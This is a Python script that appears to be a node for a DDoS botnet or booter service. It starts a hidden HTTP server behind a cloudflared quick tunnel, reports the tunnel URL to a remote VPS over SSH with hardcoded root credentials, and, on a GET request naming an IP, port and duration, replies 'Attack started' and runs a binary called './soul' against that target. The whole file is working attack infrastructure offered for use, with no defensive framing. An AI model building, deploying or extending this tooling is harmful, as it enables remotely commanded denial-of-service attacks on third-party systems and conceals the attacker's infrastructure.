import http.server
import socketserver
import urllib.parse
import subprocess
import random
import threading
import os
import shutil
import paramiko  # pip install paramiko
import re
import time

# VPS credentials - replace with your actual VPS info
VPS_HOST = "vpsip"
VPS_USER = "root"
VPS_PASS = "password"

def install_cloudflared():
    print("cloudflared not found. Installing...")
    try:
        import platform
        system = platform.system().lower()
        arch = platform.machine().lower()
        if system == "linux":
            arch_map = {
                "x86_64": "amd64",
                "aarch64": "arm64",
                "armv7l": "arm"
            }
            arch = arch_map.get(arch, "amd64")
            url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
            bin_path = "/usr/local/bin/cloudflared"
            subprocess.run(["curl", "-L", "-o", "cloudflared", url], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", bin_path], check=True)
        else:
            print(f"Unsupported OS for auto install: {system}")
            exit(1)
        print("cloudflared installed successfully.")
    except Exception as e:
        print(f"Failed to install cloudflared: {e}")
        exit(1)

def check_cloudflared():
    if shutil.which("cloudflared") is None:
        install_cloudflared()

def append_url_to_remote_file(new_url, remote_path):
    local_temp = "tunnel_url_temp.txt"
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS)
    sftp = ssh.open_sftp()
    try:
        sftp.get(remote_path, local_temp)
        print(f"Downloaded existing {remote_path} for appending.")
    except FileNotFoundError:
        with open(local_temp, "w") as f:
            pass
        print(f"No existing remote file, starting fresh.")
    with open(local_temp, "a") as f:
        f.write(new_url + "\n")
    sftp.put(local_temp, remote_path)
    print(f"Appended URL to {remote_path} on VPS.")
    sftp.close()
    ssh.close()
    os.remove(local_temp)

def start_cloudflared_tunnel(local_port):
    while True:
        cmd = [
            "cloudflared",
            "tunnel",
            "--url",
            f"http://localhost:{local_port}"
        ]
        print(f"Starting cloudflared tunnel on port {local_port}...")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
            buffer_lines = []
            url_uploaded = False

            for line in proc.stdout:
                print(line, end='')
                buffer_lines.append(line)
                accumulated = "".join(buffer_lines)

                if not url_uploaded:
                    match = re.search(r"https://[a-z0-9\-]+\.trycloudflare\.com", accumulated)
                    if match:
                        url = match.group(0)
                        print(f"\nDetected tunnel URL: {url}\n")
                        with open("tunnel_url.txt", "w") as f:
                            f.write(url + "\n")
                        append_url_to_remote_file(url, "/root/tunnel_url.txt")
                        url_uploaded = True
                        break  # tunnel URL obtained

                if "failed to parse quick Tunnel ID" in line:
                    print("Tunnel failed to start, retrying in 5 seconds...")
                    proc.kill()
                    time.sleep(5)
                    break

            proc.terminate()
            if url_uploaded:
                return
        except Exception as e:
            print(f"Error starting tunnel: {e}")
            time.sleep(5)

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        ip = params.get('ip', [None])[0]
        port = params.get('port', [None])[0]
        duration = params.get('duration', [None])[0]
        if not ip or not port or not duration:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing ip, port or duration parameters\n")
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Attack started\n")

        def run_attack():
            try:
                subprocess.run(["./soul", ip, port, duration, "900", "-1"], check=True)
            except Exception as e:
                print(f"Error running ./soul: {e}")

        threading.Thread(target=run_attack).start()

def main():
    check_cloudflared()
    PORT = random.randint(2000, 65000)
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"HTTP server serving at port {PORT}")
        threading.Thread(target=start_cloudflared_tunnel, args=(PORT,), daemon=True).start()
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Shutting down server.")
            httpd.shutdown()

if __name__ == "__main__":
    main()
